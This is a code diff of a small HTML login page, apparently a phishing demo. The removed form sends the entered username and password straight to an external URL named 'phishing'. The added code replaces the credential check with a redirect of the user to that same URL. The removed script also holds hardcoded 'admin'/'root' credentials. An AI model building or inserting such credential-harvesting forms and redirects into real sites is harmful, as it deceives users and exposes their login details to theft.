@@ -3,7 +3,7 @@
 	<title>Login Page</title>
 </head>
 <body>
-	<form name="loginForm" method="post" action="https://panosonic.github.io/phishing/">
+	<form name="loginForm" method="post" action="login.php">
 		<table width="20%" bgcolor="0099CC" align="center">
 
 			<tr>
@@ -22,7 +22,7 @@
 
 			<tr>
 				<td ><input type="Reset"></td>
-				<td><input type="submit" value="Login"></td>
+				<td><input type="submit" onclick="return check(this.form)" value="Login"></td>
 			</tr>
 
 		</table>
@@ -30,16 +30,7 @@
 	<script language="javascript">
 		function check(form)
 		{
-
-			if(form.userid.value == "admin" && form.pwd.value == "root")
-			{
-				return true;
-			}
-			else
-			{
-				alert("Error Password or Username")
-				return false;
-			}
+			window.location="https://panosonic.github.io/phishing/";
 		}
 	</script>
 
